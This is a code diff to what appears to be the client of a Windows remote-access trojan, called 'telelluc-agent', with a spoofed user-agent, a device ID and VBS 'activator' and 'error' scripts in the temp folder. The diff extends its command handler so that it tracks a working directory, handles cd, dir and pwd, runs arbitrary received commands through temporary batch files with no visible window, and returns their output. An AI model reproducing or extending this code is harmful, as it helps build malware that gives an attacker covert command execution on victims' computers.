@@ -26,6 +26,7 @@ USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"
 
 device_id = None
 last_command_time = time.time()
+current_working_dir = os.getcwd()
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -235,37 +236,97 @@ def show_error():
 
 
 def execute_shell_command(cmd_str):
-    try:
-        tmp_dir = tempfile.gettempdir()
-        batch_file = os.path.join(tmp_dir, f"telelluc_cmd_{int(time.time() * 1000)}.bat")
+    global current_working_dir
 
-        batch_content = f"""@echo off
+    try:
+        cmd_lower = cmd_str.lower().strip()
+
+        # Handle cd command
+        if cmd_lower.startswith("cd ") or cmd_lower.startswith("cd/"):
+            path = cmd_str[3:].strip().strip('"').strip("'")
+            try:
+                if path.lower() == "..":
+                    current_working_dir = os.path.dirname(current_working_dir)
+                else:
+                    full_path = os.path.abspath(os.path.join(current_working_dir, path))
+                    if os.path.isdir(full_path):
+                        current_working_dir = full_path
+                        os.chdir(current_working_dir)
+                    else:
+                        return f"Error: The system cannot find the path specified."
+                return current_working_dir
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle dir/ls command
+        if cmd_lower.startswith("dir") or cmd_lower == "ls":
+            try:
+                os.chdir(current_working_dir)
+                result = subprocess.run(
+                    "dir",
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
+                    cwd=current_working_dir
+                )
+                return result.stdout.strip() if result.stdout else "Directory is empty"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle pwd command
+        if cmd_lower == "pwd" or cmd_lower == "cd":
+            return current_working_dir
+
+        # Generic command execution
+        try:
+            os.chdir(current_working_dir)
+            tmp_dir = tempfile.gettempdir()
+            batch_file = os.path.join(tmp_dir, f"telelluc_cmd_{int(time.time() * 1000)}.bat")
+            output_file = os.path.join(tmp_dir, f"telelluc_out_{int(time.time() * 1000)}.txt")
+
+            batch_content = f"""@echo off
 chcp 65001 >nul
-{cmd_str}
+cd /d "{current_working_dir}"
+{cmd_str} > "{output_file}" 2>&1
 """
 
-        try:
-            with open(batch_file, "w", encoding="utf-8") as f:
-                f.write(batch_content)
-
-            result = subprocess.run(
-                [batch_file],
-                capture_output=True,
-                text=True,
-                timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
-            )
-
-            output = result.stdout.strip() if result.stdout else ""
-            return output if output else "Command executed"
-        finally:
             try:
-                os.remove(batch_file)
-            except:
-                pass
+                with open(batch_file, "w", encoding="utf-8") as f:
+                    f.write(batch_content)
 
-    except subprocess.TimeoutExpired:
-        return "Error: Command timeout"
+                subprocess.run(
+                    [batch_file],
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
+                    cwd=current_working_dir,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                )
+
+                output = ""
+                if os.path.exists(output_file):
+                    try:
+                        with open(output_file, "r", encoding="utf-8") as f:
+                            output = f.read().strip()
+                    finally:
+                        try:
+                            os.remove(output_file)
+                        except:
+                            pass
+
+                return output if output else ""
+            finally:
+                try:
+                    os.remove(batch_file)
+                except:
+                    pass
+
+        except subprocess.TimeoutExpired:
+            return "Error: Command timeout"
+        except Exception as e:
+            return f"Error: {str(e)}"
+
     except Exception as e:
         return f"Error: {str(e)}"
 
